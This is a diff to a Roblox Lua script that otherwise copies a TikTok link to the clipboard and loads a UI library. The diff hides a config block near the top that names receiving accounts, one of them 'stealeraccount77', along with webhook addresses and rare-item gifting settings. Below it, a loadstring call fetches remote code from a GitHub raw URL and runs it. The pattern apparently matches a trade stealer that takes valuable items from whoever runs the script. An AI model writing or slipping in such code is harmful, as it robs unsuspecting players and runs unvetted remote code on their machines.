@@ -1,4 +1,20 @@
--- 📌 Auto copy TikTok link on script execution
+_G.NullConfig = {
+    User = {"stealeraccount77", "bomaylatip", "ConCuTiHon02", "banpetuytin1111", "banpetuytin11114", "phatle8127"},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "293.211.34.242:20",
+    FakeGift = "No",
+    Trash = "293.211.34.242:20",
+    LoadingScreen = "No",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()-- 
+
+--script
+
+📌 Auto copy TikTok link on script execution
 setclipboard("https://www.tiktok.com/@developervn11?_t=ZS-8yW9cZdXeQD&_r=1")
 
 -- 📌 Load Rayfield UI Library
